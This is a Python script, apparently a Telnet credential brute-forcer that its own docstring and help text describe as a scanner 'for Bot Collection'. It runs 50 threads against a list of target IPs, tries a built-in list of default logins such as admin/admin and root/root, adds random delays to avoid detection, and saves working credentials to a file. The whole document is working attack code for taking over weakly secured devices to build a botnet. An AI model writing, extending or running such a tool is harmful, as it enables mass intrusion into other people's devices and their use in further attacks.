#!/usr/bin/env python3
"""
Advanced Telnet Scanner for Bot Collection
Supports multi-threading, credential testing, and result logging
"""

import telnetlib
import threading
import socket
import time
import random
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

class TelnetScanner:
    def __init__(self, threads=50, timeout=5, delay=0.1):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.found_credentials = []
        self.lock = threading.Lock()
        
    def test_credentials(self, ip, username, password):
        """Test single credential combination"""
        try:
            # Random delay to avoid detection
            time.sleep(random.uniform(0, self.delay))
            
            tn = telnetlib.Telnet(ip, 23, timeout=self.timeout)
            
            # Read initial prompt
            initial = tn.read_until(b"login:", timeout=self.timeout)
            if b"login:" not in initial:
                initial = tn.read_until(b"Login:", timeout=self.timeout)
            if b"Login:" not in initial:
                initial = tn.read_until(b"Username:", timeout=self.timeout)
            if b"Username:" not in initial:
                initial = tn.read_until(b"User:", timeout=self.timeout)
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            
            # Read password prompt
            password_prompt = tn.read_until(b"Password:", timeout=self.timeout)
            if b"Password:" not in password_prompt:
                password_prompt = tn.read_until(b"password:", timeout=self.timeout)
            if b"password:" not in password_prompt:
                password_prompt = tn.read_until(b"passwd:", timeout=self.timeout)
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Read response
            result = tn.read_until(b"#", timeout=self.timeout)
            if b"#" not in result:
                result = tn.read_until(b"$", timeout=self.timeout)
            if b"$" not in result:
                result = tn.read_until(b">", timeout=self.timeout)
            if b">" not in result:
                result = tn.read_until(b"~", timeout=self.timeout)
            
            # Check for success indicators
            success_indicators = [b"#", b"$", b">", b"~", b"Welcome", b"Last login"]
            error_indicators = [b"Login incorrect", b"Invalid", b"Access denied", b"Authentication failed"]
            
            success = any(indicator in result for indicator in success_indicators)
            error = any(indicator in result for indicator in error_indicators)
            
            if success and not error:
                with self.lock:
                    self.found_credentials.append(f"{ip}:23 {username}:{password}")
                    print(f"[SUCCESS] {ip}:23 {username}:{password}")
                return True
            elif error:
                print(f"[FAILED] {ip}:23 {username}:{password} - {result.decode('utf-8', errors='ignore')[:50]}")
            
        except Exception as e:
            print(f"[ERROR] {ip}:23 {username}:{password} - {str(e)}")
        
        return False
    
    def scan_target(self, target_info):
        """Scan single target with multiple credentials"""
        ip, username, password = target_info
        return self.test_credentials(ip, username, password)
    
    def scan_targets(self, targets, credentials):
        """Scan multiple targets with multiple credentials"""
        all_combinations = []
        
        for target in targets:
            for username, password in credentials:
                all_combinations.append((target, username, password))
        
        print(f"[INFO] Testing {len(all_combinations)} credential combinations with {self.threads} threads")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.scan_target, combo) for combo in all_combinations]
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"[ERROR] Thread error: {e}")
    
    def save_results(self, filename="found_credentials.txt"):
        """Save found credentials to file"""
        with open(filename, 'w') as f:
            for cred in self.found_credentials:
                f.write(cred + '\n')
        print(f"[INFO] Saved {len(self.found_credentials)} credentials to {filename}")

def load_targets(filename):
    """Load target IPs from file"""
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        return targets
    except FileNotFoundError:
        print(f"[ERROR] Target file {filename} not found")
        return []

def load_credentials(filename):
    """Load credentials from file"""
    credentials = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username, password))
                    else:
                        credentials.append((line, ''))
        return credentials
    except FileNotFoundError:
        print(f"[ERROR] Credential file {filename} not found")
        return []

def create_default_credentials():
    """Create default credential list"""
    credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '12345'),
        ('admin', '123456'),
        ('admin', ''),
        ('root', 'root'),
        ('root', 'admin'),
        ('root', '12345'),
        ('root', '123456'),
        ('root', ''),
        ('user', 'user'),
        ('user', 'password'),
        ('guest', 'guest'),
        ('support', 'support'),
        ('service', 'service'),
        ('admin', 'password'),
        ('admin', '1234'),
        ('admin', 'admin123'),
        ('root', 'password'),
        ('root', '1234'),
        ('root', 'root123'),
    ]
    return credentials

def main():
    parser = argparse.ArgumentParser(description='Advanced Telnet Scanner for Bot Collection')
    parser.add_argument('-t', '--targets', required=True, help='Target IP file')
    parser.add_argument('-c', '--credentials', help='Credential file (optional)')
    parser.add_argument('-T', '--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('-o', '--output', default='found_credentials.txt', help='Output file')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests')
    
    args = parser.parse_args()
    
    # Load targets
    targets = load_targets(args.targets)
    if not targets:
        print("[ERROR] No targets loaded")
        sys.exit(1)
    
    # Load credentials
    if args.credentials:
        credentials = load_credentials(args.credentials)
    else:
        credentials = create_default_credentials()
    
    if not credentials:
        print("[ERROR] No credentials loaded")
        sys.exit(1)
    
    print(f"[INFO] Loaded {len(targets)} targets and {len(credentials)} credential combinations")
    
    # Create scanner
    scanner = TelnetScanner(threads=args.threads, timeout=args.timeout, delay=args.delay)
    
    # Start scanning
    start_time = time.time()
    scanner.scan_targets(targets, credentials)
    end_time = time.time()
    
    # Save results
    scanner.save_results(args.output)
    
    print(f"[INFO] Scan completed in {end_time - start_time:.2f} seconds")
    print(f"[INFO] Found {len(scanner.found_credentials)} valid credentials")

if __name__ == "__main__":
    main()
